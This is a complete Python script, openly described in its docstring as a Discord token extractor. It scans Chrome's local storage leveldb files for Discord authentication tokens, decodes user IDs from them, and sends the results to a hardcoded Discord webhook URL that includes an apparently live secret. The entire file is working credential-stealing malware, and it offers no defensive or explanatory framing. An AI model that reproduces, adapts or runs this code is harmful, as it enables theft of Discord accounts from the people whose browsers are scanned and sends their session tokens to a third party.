"""Script to extract Discord tokens from Chrome's local storage."""

import base64
import json
import os
import re
import urllib.request
from pathlib import Path

TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
}
WEBHOOK_URL = "https://discord.com/api/webhooks/1436838449704337506/CGX8wgKHT2lt0aFq72vfdS_UVPoNTjD1HJSzCO7oYOEYRIzX6kOljx_IgDpDydGhCawj"  # Replace with your actual webhook URL


def make_post_request(api_url: str, data: dict) -> int:
    """Makes a POST request to the specified URL.
    
    Args:
        api_url: API URL to contact
        data: Data to send in JSON format
        
    Returns:
        HTTP status code of the response
        
    Raises:
        ValueError: If URL is invalid
        urllib.error.URLError: On connection error
    """
    if not api_url.startswith(("http://", "https://")):
        raise ValueError("URL must start with http:// or https://")

    json_data = json.dumps(data).encode("utf-8")
    
    request = urllib.request.Request(  # noqa: S310
        api_url,
        data=json_data,
        headers=REQUEST_HEADERS,
        method="POST",
    )

    with urllib.request.urlopen(request, timeout=10) as response:  # noqa: S310
        return response.status


def get_tokens_from_file(file_path: Path) -> list[str] | None:
    """Extracts potential tokens from a file.
    
    Args:
        file_path: Path to the file to analyze
        
    Returns:
        List of potential tokens or None if error
    """
    try:
        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
    except (PermissionError, FileNotFoundError, OSError):
        return None

    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
    return tokens if tokens else None


def get_user_id_from_token(token: str) -> str | None:
    """Extracts user ID from a potential token.
    
    Args:
        token: Token to verify
        
    Returns:
        Discord user ID or None if invalid
    """
    try:
        token_part = token.split(".", maxsplit=1)[0]
        # Add padding to avoid decoding errors
        padded_token = token_part + "=="
        decoded_bytes = base64.b64decode(padded_token)
        discord_user_id = decoded_bytes.decode("utf-8", errors="strict")
        
        # Basic validation - ID should be numeric
        if discord_user_id.isdigit():
            return discord_user_id
            
    except (UnicodeDecodeError, ValueError, IndexError, base64.binascii.Error):
        return None
    
    return None


def get_tokens_from_path(base_path: Path) -> dict[str, set[str]] | None:
    """Collects Discord tokens from a directory.
    
    Args:
        base_path: Directory path to analyze
        
    Returns:
        Dictionary mapping user IDs to their tokens
    """
    if not base_path.exists() or not base_path.is_dir():
        return None

    try:
        file_paths = [file for file in base_path.iterdir() if file.is_file()]
    except (PermissionError, OSError):
        return None

    id_to_tokens: dict[str, set[str]] = {}

    for file_path in file_paths:
        potential_tokens = get_tokens_from_file(file_path)

        if not potential_tokens:
            continue

        for potential_token in potential_tokens:
            discord_user_id = get_user_id_from_token(potential_token)

            if not discord_user_id:
                continue

            if discord_user_id not in id_to_tokens:
                id_to_tokens[discord_user_id] = set()

            id_to_tokens[discord_user_id].add(potential_token)

    return id_to_tokens if id_to_tokens else None


def send_tokens_to_webhook(
    webhook_url: str, 
    user_id_to_token: dict[str, set[str]],
) -> int:
    """Sends collected tokens to a Discord webhook.
    
    Args:
        webhook_url: Discord webhook URL
        user_id_to_token: Dictionary of tokens organized by user ID
        
    Returns:
        HTTP status code of the request
    """
    fields: list[dict] = []

    for user_id, tokens in user_id_to_token.items():
        # Limit length to avoid overly long messages
        token_list = "\n".join(list(tokens)[:10])  # Maximum 10 tokens per user
        if len(tokens) > 10:
            token_list += f"\n... and {len(tokens) - 10} more tokens"
            
        fields.append({
            "name": f"User {user_id}",
            "value": f"```\n{token_list}\n```",
            "inline": False,
        })

    data = {
        "content": "Found Discord tokens",
        "embeds": [{
            "title": "Token Collection Results",
            "fields": fields,
            "color": 0xff0000  # Red color
        }]
    }

    return make_post_request(webhook_url, data)


def main() -> None:
    """Main function of the script."""
    local_app_data = os.getenv("LOCALAPPDATA")

    if not local_app_data:
        raise OSError("LOCALAPPDATA environment variable not found")

    chrome_path = (
        Path(local_app_data) / 
        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
    )

    if not chrome_path.exists():
        print(f"Chrome path not found: {chrome_path}")
        return

    tokens = get_tokens_from_path(chrome_path)

    if not tokens:
        print("No tokens found")
        return

    print(f"Found tokens for {len(tokens)} user(s)")
    
    try:
        status_code = send_tokens_to_webhook(WEBHOOK_URL, tokens)
        print(f"Webhook sent with status: {status_code}")
    except Exception as e:
        print(f"Error sending webhook: {e}")


if __name__ == "__main__":
    main()